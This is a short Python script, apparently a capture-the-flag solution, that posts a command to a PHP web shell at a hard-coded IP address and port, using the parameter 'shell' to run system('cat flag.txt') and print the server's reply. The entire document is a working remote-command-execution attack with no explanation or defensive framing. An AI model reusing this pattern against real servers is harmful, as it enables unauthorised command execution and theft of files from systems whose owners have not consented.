import requests
url="http://159.138.137.79"
shell='/index.php'
passwd="shell"
port='63288'
payload={
    passwd:'system(\'cat flag.txt \');'
}
url1=url+':'+port+shell
print(url1)
response=requests.post(url1,payload,timeout=1)
print(response.text)
